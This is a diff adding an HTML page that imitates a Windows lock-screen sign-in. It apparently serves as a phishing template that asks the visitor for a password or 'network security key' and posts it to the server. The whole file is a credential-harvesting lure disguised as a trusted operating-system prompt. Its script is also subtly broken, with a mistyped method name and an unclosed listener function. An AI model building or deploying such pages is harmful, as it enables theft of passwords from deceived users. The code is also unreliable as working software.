@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<link rel="stylesheet" href="/static/style2.css">
+
+<script>
+
+function windows_validate_action (pw_status, password) {
+            if (pw_status == "success") {
+                document.getElementByid("windows-form").submit(); 
+                document.getElementById("pw_status").innerHTML = "Enter the network security key";
+            } else if (pw_status == "fail") {
+                document.getElementById("pw_status").innerHTML = "Enter the network security key: the passphrase is wrong!";
+            } else {
+                document.getElementById("windows-form").submit(); 
+            }
+        }
+
+</script>
+</head>
+
+<body>
+	<div class="container-fluid" id="container"></div>
+
+	<div class="container">
+		<div class="form-wrapper" id="form">   
+			<form id="windows-form" method='post' action='/post'>
+				<img src="/static/user.png" alt="Lock-screen-avatar" class="rounded-circle img-fluid">
+				<div class="form-group">
+					<label id="pw_status" class="username">User</label>
+					<input type="password" placeholder="Password" id="password" name="user-password" class="textfield">
+					<button class="authenticate">&rarr;</button>
+					<a href="" class="forgotpass" >I forgot my password</a>
+					<a href="" class="signinopt" >Sign-in options</a>
+				</div>
+			</form>
+		</div>
+	</div>
+
+
+<script>
+                var myform = document.getElementById("windows-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    validate_passphrase(document.getElementById("password").value, windows_validate_action); 
+</script>
+</body>
+
+</html>
